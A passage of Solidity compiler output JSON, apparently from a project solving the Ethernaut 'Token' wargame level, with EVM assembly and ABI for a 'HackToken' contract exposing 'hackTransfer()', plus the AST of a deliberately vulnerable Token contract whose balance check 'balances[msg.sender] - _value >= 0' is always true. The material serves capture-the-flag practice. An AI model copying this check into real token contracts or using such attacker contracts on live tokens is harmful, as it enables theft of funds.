											"begin": 1291,
											"end": 1427,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1291,
											"end": 1427,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1291,
											"end": 1427,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1291,
											"end": 1427,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1291,
											"end": 1427,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1433,
											"end": 1529,
											"name": "tag",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1433,
											"end": 1529,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1433,
											"end": 1529,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1499,
											"end": 1523,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 1517,
											"end": 1522,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1499,
											"end": 1523,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1499,
											"end": 1523,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1499,
											"end": 1523,
											"name": "tag",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 1499,
											"end": 1523,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1488,
											"end": 1523,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1488,
											"end": 1523,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1478,
											"end": 1529,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1478,
											"end": 1529,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1478,
											"end": 1529,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1478,
											"end": 1529,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1535,
											"end": 1625,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1535,
											"end": 1625,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1535,
											"end": 1625,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1612,
											"end": 1617,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1605,
											"end": 1618,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1598,
											"end": 1619,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1587,
											"end": 1619,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1587,
											"end": 1619,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1577,
											"end": 1625,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1577,
											"end": 1625,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1577,
											"end": 1625,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1577,
											"end": 1625,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1631,
											"end": 1757,
											"name": "tag",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1631,
											"end": 1757,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1631,
											"end": 1757,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1708,
											"end": 1750,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1701,
											"end": 1706,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1697,
											"end": 1751,
											"name": "AND",
											"source": 2
										},
										{
											"begin": 1686,
											"end": 1751,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1686,
											"end": 1751,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1676,
											"end": 1757,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1676,
											"end": 1757,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1676,
											"end": 1757,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1676,
											"end": 1757,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1763,
											"end": 1840,
											"name": "tag",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 1763,
											"end": 1840,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1763,
											"end": 1840,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1829,
											"end": 1834,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1818,
											"end": 1834,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1818,
											"end": 1834,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1808,
											"end": 1840,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1808,
											"end": 1840,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1808,
											"end": 1840,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1808,
											"end": 1840,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1846,
											"end": 1996,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 1846,
											"end": 1996,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1846,
											"end": 1996,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1941,
											"end": 1990,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1984,
											"end": 1989,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1941,
											"end": 1990,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1941,
											"end": 1990,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1941,
											"end": 1990,
											"name": "tag",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1941,
											"end": 1990,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1928,
											"end": 1990,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1928,
											"end": 1990,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1918,
											"end": 1996,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1918,
											"end": 1996,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1918,
											"end": 1996,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1918,
											"end": 1996,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2002,
											"end": 2127,
											"name": "tag",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 2002,
											"end": 2127,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2002,
											"end": 2127,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2097,
											"end": 2121,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 2115,
											"end": 2120,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2097,
											"end": 2121,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 2097,
											"end": 2121,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2097,
											"end": 2121,
											"name": "tag",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 2097,
											"end": 2121,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2084,
											"end": 2121,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2084,
											"end": 2121,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2074,
											"end": 2127,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2074,
											"end": 2127,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2074,
											"end": 2127,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2074,
											"end": 2127,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2133,
											"end": 2249,
											"name": "tag",
											"source": 2,
											"value": "23"
										},
										{
											"begin": 2133,
											"end": 2249,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2203,
											"end": 2224,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "57"
										},
										{
											"begin": 2218,
											"end": 2223,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2203,
											"end": 2224,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 2203,
											"end": 2224,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2203,
											"end": 2224,
											"name": "tag",
											"source": 2,
											"value": "57"
										},
										{
											"begin": 2203,
											"end": 2224,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2196,
											"end": 2201,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2193,
											"end": 2225,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 2183,
											"end": 2185,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 2183,
											"end": 2185,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2239,
											"end": 2240,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2236,
											"end": 2237,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 2229,
											"end": 2241,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2183,
											"end": 2185,
											"name": "tag",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 2183,
											"end": 2185,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2173,
											"end": 2249,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2173,
											"end": 2249,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"hackTransfer()": "1191c087",
							"token()": "fc0c546a"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.1+commit.df193b15\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"hackTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token\",\"outputs\":[{\"internalType\":\"contract Token\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/ethernautTokenHack.sol\":\"HackToken\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/ethernautToken.sol\":{\"keccak256\":\"0xc3ea9d87433a6f773c98fa4e31f92711c9ebedfaf29b9c7361181d22a913f1c5\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://afc3172ec0ff8a08128870124a662ba2fcdf262a614db41f2efcf83e6aceca94\",\"dweb:/ipfs/QmSukdAcBLgbsTCr4DzgAvyHAdz87fNCpNkrzVmeoVimvj\"]},\"contracts/ethernautTokenHack.sol\":{\"keccak256\":\"0x876d67bedc29305265625d294b455f110bfc424b6d119fe570ff73a265c319db\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://e7b69dda0ac5297f78f56b429dff8ed00a0faeea3607d03b3a8f6247c778367f\",\"dweb:/ipfs/QmXMn2V1zFousvuiG45MTKYBMsaBju2X6hupf4kNWkBov7\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 77,
								"contract": "contracts/ethernautTokenHack.sol:HackToken",
								"label": "token",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(Token)71"
							}
						],
						"types": {
							"t_contract(Token)71": {
								"encoding": "inplace",
								"label": "contract Token",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "2462",
				"formattedMessage": "Warning: Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.\n --> contracts/ethernautToken.sol:9:3:\n  |\n9 |   constructor(uint _initialSupply) public {\n  |   ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.",
				"severity": "warning",
				"sourceLocation": {
					"end": 254,
					"file": "contracts/ethernautToken.sol",
					"start": 150
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "2462",
				"formattedMessage": "Warning: Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.\n --> contracts/ethernautTokenHack.sol:8:5:\n  |\n8 |     constructor(address _token)public{\n  |     ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.",
				"severity": "warning",
				"sourceLocation": {
					"end": 225,
					"file": "contracts/ethernautTokenHack.sol",
					"start": 152
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/ethernautToken.sol": {
				"ast": {
					"absolutePath": "contracts/ethernautToken.sol",
					"exportedSymbols": {
						"Token": [
							71
						]
					},
					"id": 72,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 71,
							"linearizedBaseContracts": [
								71
							],
							"name": "Token",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 5,
									"mutability": "mutable",
									"name": "balances",
									"nodeType": "VariableDeclaration",
									"scope": 71,
									"src": "82:33:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 4,
										"keyType": {
											"id": 2,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "90:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "82:24:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 3,
											"name": "uint",
											"nodeType": "ElementaryTypeName",
											"src": "101:4:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"functionSelector": "18160ddd",
									"id": 7,
									"mutability": "mutable",
									"name": "totalSupply",
									"nodeType": "VariableDeclaration",
									"scope": 71,
									"src": "120:23:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "120:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 21,
										"nodeType": "Block",
										"src": "190:64:0",
										"statements": [
											{
												"expression": {
													"id": 19,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"baseExpression": {
															"id": 12,
															"name": "balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 5,
															"src": "197:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 15,
														"indexExpression": {
															"expression": {
																"id": 13,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "206:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 14,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "206:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "197:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 18,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"id": 16,
															"name": "totalSupply",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 7,
															"src": "220:11:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"id": 17,
															"name": "_initialSupply",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 9,
															"src": "234:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "220:28:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "197:51:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 20,
												"nodeType": "ExpressionStatement",
												"src": "197:51:0"
											}
										]
									},
									"id": 22,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 9,
												"mutability": "mutable",
												"name": "_initialSupply",
												"nodeType": "VariableDeclaration",
												"scope": 22,
												"src": "162:19:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 8,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "162:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "161:21:0"
									},
									"returnParameters": {
										"id": 11,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "190:0:0"
									},
									"scope": 71,
									"src": "150:104:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 57,
										"nodeType": "Block",
										"src": "326:141:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 39,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 37,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"baseExpression": {
																		"id": 32,
																		"name": "balances",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 5,
																		"src": "341:8:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																			"typeString": "mapping(address => uint256)"
																		}
																	},
																	"id": 35,
																	"indexExpression": {
																		"expression": {
																			"id": 33,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967281,
																			"src": "350:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 34,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"src": "350:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "341:20:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "-",
																"rightExpression": {
																	"id": 36,
																	"name": "_value",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 26,
																	"src": "364:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "341:29:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"hexValue": "30",
																"id": 38,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "374:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "341:34:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 31,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "333:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 40,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "333:43:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 41,
												"nodeType": "ExpressionStatement",
												"src": "333:43:0"
											},
											{
												"expression": {
													"id": 47,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"baseExpression": {
															"id": 42,
															"name": "balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 5,
															"src": "383:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 45,
														"indexExpression": {
															"expression": {
																"id": 43,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "392:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 44,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "392:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "383:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "-=",
													"rightHandSide": {
														"id": 46,
														"name": "_value",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 26,
														"src": "407:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "383:30:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 48,
												"nodeType": "ExpressionStatement",
												"src": "383:30:0"
											},
											{
												"expression": {
													"id": 53,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"baseExpression": {
															"id": 49,
															"name": "balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 5,
															"src": "420:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 51,
														"indexExpression": {
															"id": 50,
															"name": "_to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 24,
															"src": "429:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "420:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"id": 52,
														"name": "_value",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 26,
														"src": "437:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "420:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 54,
												"nodeType": "ExpressionStatement",
												"src": "420:23:0"
											},
											{
												"expression": {
													"hexValue": "74727565",
													"id": 55,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "457:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 30,
												"id": 56,
												"nodeType": "Return",
												"src": "450:11:0"
											}
										]
									},
									"functionSelector": "a9059cbb",
									"id": 58,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 27,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 24,
												"mutability": "mutable",
												"name": "_to",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "278:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 23,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "278:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 26,
												"mutability": "mutable",
												"name": "_value",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "291:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 25,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "291:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "277:26:0"
									},
									"returnParameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 29,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "320:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 28,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "320:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "319:6:0"
									},
									"scope": 71,
									"src": "260:207:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 69,
										"nodeType": "Block",
										"src": "543:36:0",
										"statements": [
											{
												"expression": {
													"baseExpression": {
														"id": 65,
														"name": "balances",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "557:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 67,
													"indexExpression": {
														"id": 66,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 60,
														"src": "566:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "557:16:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 64,
												"id": 68,
												"nodeType": "Return",
												"src": "550:23:0"
											}
										]
									},
									"functionSelector": "70a08231",
									"id": 70,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 61,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 60,
												"mutability": "mutable",
												"name": "_owner",
												"nodeType": "VariableDeclaration",
												"scope": 70,
												"src": "492:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 59,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "492:7:0",
